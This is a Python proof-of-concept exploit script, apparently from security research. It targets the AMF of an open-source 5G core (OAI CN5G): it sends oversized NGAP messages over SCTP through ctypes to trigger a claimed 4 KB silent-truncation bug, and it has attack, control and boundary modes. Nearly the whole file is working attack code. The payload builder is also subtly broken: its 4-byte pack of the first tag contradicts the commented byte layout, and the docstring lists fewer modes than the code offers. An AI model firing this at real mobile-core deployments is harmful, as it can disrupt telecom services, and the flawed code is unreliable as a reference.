#!/usr/bin/env python3
"""
PoC: demonstrate OAI CN5G AMF SCTP 4KB silent truncation
(cand-oai-amf-sctp-trunc-01)

Vulnerability class: CWE-130 / RFC 6458 §8 std-deviation / 3GPP TS 38.413 §8.3.
Root cause: sctp_recvmsg with fixed 4096 stack buffer, MSG_TRUNC / MSG_EOR
flags ignored. Legitimate >4KB NGAP PDU is silently truncated.

Usage:
    sudo python3 sctp_trunc_poc.py --target 172.31.100.20 --port 38412 \
        --mode {attack|control} --size 4600

Modes:
    attack  : send NGAP-like PDU of `--size` bytes (>4096), expect truncation
    control : send NGAP-like PDU of `--size` bytes (<=4096), expect full read

Notes:
    - Uses kernel AF_INET/SOCK_STREAM/IPPROTO_SCTP=132 via ctypes (Python's
      `socket` module does not expose AF_SCTP constants here).
    - PPID=60 = NGAP per 3GPP TS 36.413/38.413 §8.3 SCTP payload protocol id.
    - A minimal APER header is prepended so the outer PDU length promise matches
      the declared size (a valid PDU that would exceed the 4096 buffer).
"""
import argparse
import ctypes
import ctypes.util
import socket
import struct
import sys
import os
import time

AF_INET = socket.AF_INET
SOCK_STREAM = socket.SOCK_STREAM
IPPROTO_SCTP = 132  # <netinet/in.h> IPPROTO_SCTP
SCTP_PPID_NGAP = 60

libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
libc.socket.restype = ctypes.c_int
libc.socket.argtypes = (ctypes.c_int, ctypes.c_int, ctypes.c_int)
libc.close.argtypes = (ctypes.c_int,)
libc.connect.restype = ctypes.c_int
libc.connect.argtypes = (ctypes.c_int, ctypes.c_void_p, ctypes.c_int)
libc.send.restype = ctypes.c_ssize_t
libc.send.argtypes = (ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int)
# sctp_sendmsg lives in libsctp.so (kernel lksctp userspace wrapper).
libsctp = ctypes.CDLL(ctypes.util.find_library('sctp') or 'libsctp.so.1',
                      use_errno=True)


class sockaddr_in(ctypes.Structure):
    _fields_ = [("sin_family", ctypes.c_ushort),
                ("sin_port", ctypes.c_ushort),
                ("sin_addr", ctypes.c_uint32),
                ("sin_zero", ctypes.c_ubyte * 8)]


# sctp_sendmsg(3) signature from /usr/include/netinet/sctp.h:
#   int sctp_sendmsg(int s, const void *msg, size_t len, struct sockaddr *to,
#                    socklen_t tolen, uint32_t ppid, uint32_t flags,
#                    uint16_t stream_no, uint32_t timetolive, uint32_t context);
libsctp.sctp_sendmsg.restype = ctypes.c_int
libsctp.sctp_sendmsg.argtypes = (
    ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t,
    ctypes.c_void_p, ctypes.c_int,
    ctypes.c_uint32, ctypes.c_uint32,
    ctypes.c_uint16, ctypes.c_uint32, ctypes.c_uint32,
)


def build_sockaddr(ip: str, port: int) -> sockaddr_in:
    sa = sockaddr_in()
    sa.sin_family = AF_INET
    sa.sin_port = socket.htons(port)
    sa.sin_addr = struct.unpack('<I', socket.inet_aton(ip))[0]
    return sa


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True, help="AMF IP (bridge-side)")
    ap.add_argument("--port", type=int, default=38412)
    ap.add_argument("--mode", choices=["attack", "control", "boundary"],
                    required=True,
                    help="attack=>4KB, control=<=4KB, boundary=exactly 4096")
    ap.add_argument("--size", type=int, default=4600,
                    help="declared NGAP PDU length in bytes")
    ap.add_argument("--wait", type=float, default=1.5,
                    help="seconds to sleep before exit (allow AMF log flush)")
    ap.add_argument("--tag", default="", help="evidence tag prefix")
    args = ap.parse_args()

    if args.mode == "attack":
        n = max(args.size, 4600)
    elif args.mode == "control":
        n = min(args.size, 4096)
    else:  # boundary
        n = 4096

    # Build a payload of n bytes:
    #   [0]      : 0x40 (NGAP-PDU choice=initiatingMessage, APER outer tag)
    #   [1..3]   : 3-byte length field carrying (n-4) big-endian (a legal APER
    #              "unconstrained length" for a ~64KB PDU; the value is only
    #              used by us to prove the truncation, decoder still fails on
    #              the truncated prefix).
    #   [4..]    : filler 0xAA bytes to reach the requested size.
    header = struct.pack(">IBBBB",
                         0x40,
                         ((n - 4) >> 16) & 0xFF,
                         ((n - 4) >> 8) & 0xFF,
                         (n - 4) & 0xFF,
                         0x00)
    filler = b"\xAA" * (n - len(header))
    payload = header + filler

    print(f"[*] sending n={len(payload)} bytes "
          f"(mode={args.mode}) -> {args.target}:{args.port}", file=sys.stderr)

    sd = libc.socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP)
    if sd < 0:
        errno = ctypes.get_errno()
        print(f"socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP) failed: "
              f"{errno} {socket.strerror(errno)}", file=sys.stderr)
        return 2

    sa = build_sockaddr(args.target, args.port)
    rc = libc.connect(sd, ctypes.byref(sa), ctypes.sizeof(sa))
    if rc < 0:
        errno = ctypes.get_errno()
        print(f"connect failed: {errno} {socket.strerror(errno)}", file=sys.stderr)
        libc.close(sd)
        return 3

    # int sctp_sendmsg(sd, msg, len, to, tolen, ppid, flags, stream, ttl, context)
    buf = ctypes.create_string_buffer(payload, len(payload))
    sent = libsctp.sctp_sendmsg(sd, buf, len(payload),
                             None, 0,
                             socket.htonl(SCTP_PPID_NGAP),
                             0,     # flags
                             0,     # stream
                             0,     # timetolive
                             0)     # context
    if sent < 0:
        errno = ctypes.get_errno()
        print(f"sctp_sendmsg failed: {errno} {socket.strerror(errno)}",
              file=sys.stderr)
        libc.close(sd)
        return 4
    print(f"[+] sctp_sendmsg returned {sent} bytes (n={len(payload)})", file=sys.stderr)

    time.sleep(args.wait)
    libc.close(sd)
    return 0


if __name__ == "__main__":
    sys.exit(main())
